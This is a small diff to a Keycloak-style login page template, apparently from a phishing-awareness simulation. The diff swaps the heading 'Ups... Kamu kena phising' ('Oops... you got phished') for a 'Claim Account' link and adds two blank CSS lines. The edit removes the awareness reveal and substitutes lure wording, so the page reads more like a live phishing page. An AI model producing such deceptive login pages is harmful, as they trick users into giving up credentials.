@@ -20,6 +20,8 @@ div.kc-logo-text{
     width:240px;
     height:80px;
 }
+
+
 .login-pf body{
     background-size:initial;
     background-repeat:repeat;
@@ -68,8 +70,8 @@ div.kc-logo-text{
     </div>
     <div class="card-pf border-0 rounded-0 shadow bg-body p-2 p-md-4">
         <header class="login-pf-header text-primary">
-                <h1 id="kc-page-title" class="h4"><strong> Ups... Kamu kena phising 
-</strong></h1>
+                <a href="https://www.spotify.com/" id="kc-page-title" class="h4">Claim Account </a><strong> 
+</strong>
       </header>
       <div id="kc-content">
         <div id="kc-content-wrapper">
